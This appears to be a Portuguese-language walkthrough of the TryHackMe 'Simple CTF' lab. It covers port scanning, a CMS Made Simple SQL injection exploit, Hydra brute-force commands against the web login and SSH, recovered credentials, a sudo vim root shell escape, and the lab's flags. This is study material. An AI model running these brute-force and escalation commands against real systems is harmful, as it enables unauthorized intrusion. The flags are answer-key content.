### ROOM SIMPLE CTF

#### Portas:
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

#### Robots.txt:
http://10.10.187.106/robots.txt

#### Diretório oculto:
/openemr-5_0_1_3 

#### Site principal:
http://10.10.187.106/simple/

#### Aplicação:
Porta 80 - CMSMS (CMS Made Simple)

#### Vulnerabilidade:
CVE-2019-9053 - SQL Injection

https://nvd.nist.gov/vuln/detail/CVE-2019-9053
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9053

#### Exploit: 
https://www.exploit-db.com/exploits/46635
https://packetstormsecurity.com/files/152356/CMS-Made-Simple-SQL-Injection.html

#### Admin Control Panel:
http://10.10.168.186/simple/admin/login.php

#### FTP:
Como não encontrei nada que pudesse me auxiliar e os exploits tanto baixado do Exploit-DB, quando do Metasploit também não ajudaram, voltei ao inicio.

Então lembrei que tem uma porta 21 aberta para o ftp, acessei a porta (ftp 10.10.168.186) e encontrei um arquivo de texto "ForMitch.txt".
Dentro do txt, tem a seguite mensagem:

Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!

Em pt-br: 
Dammit man... Você é o pior dev que eu já vi. Você define o mesmo passe para o usuário do sistema, e a senha é tão fraca... Eu quebrei em segundos. Deus... Que bagunça!

Já sei que o usuário tem uma senha fraca e que possívelmente o nome do desenvolvedor é mitch.

#### Postagens de usuários dentro do site:
Sempre é muito importante que quando se está fazendo pentest em uma aplicação web, é necessário procurar dentro do site, por possíveis usuários que tenham feito postagens dentro dele, como noticias e artigos, para que possamos tentar um futuro brute-force.

Olhando dentro do site, vimos postagens do mitch que é o desenvolvedor da aplicação.

E como mencionado na mensagem para ele, a senha dele foi quebrada fácilmente em segundos.

Então o próximo passo é fazer um brute-force na aplicação com o usuário mitch e uma wordlist.

#### Tentativas de exploitation
Antes de tentar o brute force eu tentei usar o exploit encontrado anteriormente, mas não funcionou, não encontrou o usuário e senha da aplicação.

python 46635.py -u http://10.10.168.186/simple/admin/

python 46635.py -u http://10.10.168.186/simple/admin/ --crack -w /usr/share/wordlists/rockyou.txt

#### Brute force:
Executado o brute-force através do hydra.
https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/

hydra -v -I -l mitch -P /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt 10.10.168.186 http-post-form "/simple/admin/login.php:username=^USER^&password=^pass^&loginsubmit=submit:incorrect"

Não consegui quebrar a senha de usuário do cms manager simple utilizando o Hydra, mesmo usando vários tipos de wordlists, só não usei o rockyou, por que iria demorar muito tempo para quebrar a senha.
Mas no arquivo "ForMitch.txt", diz que o dev usou a mesma senha para o usuário do sistema, então para validação eu usei o hydra para o SSH.

hydra -v -I -l mitch -P /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt ssh://10.10.168.186 -s 2222

Quebrou a senha.
[2222][ssh] host: 10.10.168.186   login: mitch   password: secret

#### Validação das credencias:
Validado as credenciais com acesso ao SSH e ao /admin/login.php do cmsms.
ssh -p2222 mitch@10.10.158.248

#### User Flag:
/home/mitch/user.txt
G00d j0b, keep up!

#### Escalação de privilégios:
Executado o comando (sudo -l) e identificado que o binário do vim, tem permissão de executar como root.
sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#sudo
sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

sudo vim -c '!sh'
id
uid=0(root) gid=0(root) groups=0(root)

#### Root flag:
/root/root.txt
W3ll d0n3. You made it!



Referências:
https://h4ckerjosh.com/write-ups-tryhackme-simple-ctf/
https://maggick.fr/2019/10/htb-writeup.html